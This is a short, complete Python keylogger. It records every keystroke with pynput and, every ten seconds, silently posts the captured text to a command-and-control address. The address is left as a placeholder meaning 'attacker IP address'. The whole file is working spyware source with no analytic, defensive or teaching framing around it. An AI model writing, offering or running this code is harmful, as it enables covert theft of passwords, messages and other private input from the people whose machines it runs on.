import pynput.keyboard
import requests
import threading
import os
import sys

C2_SERVER_URL = "http://SALDIRGAN_IP_ADRESI:PORT/log" 
LOG_BUFFER = ""

def process_key_press(key):
    global LOG_BUFFER
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " [SPACE] "
        elif key == key.enter:
            current_key = " [ENTER]\n "
        else:
            current_key = f" [{str(key).replace('Key.', '')}] "
    LOG_BUFFER += current_key

def send_data_to_c2():
    global LOG_BUFFER
    if LOG_BUFFER:
        try:
            requests.post(C2_SERVER_URL, data={'report': LOG_BUFFER}, timeout=5)
            LOG_BUFFER = ""
        except Exception:
            pass
    
    timer = threading.Timer(10, send_data_to_c2)
    timer.daemon = True
    timer.start()

def main():
    send_data_to_c2()
    with pynput.keyboard.Listener(on_press=process_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()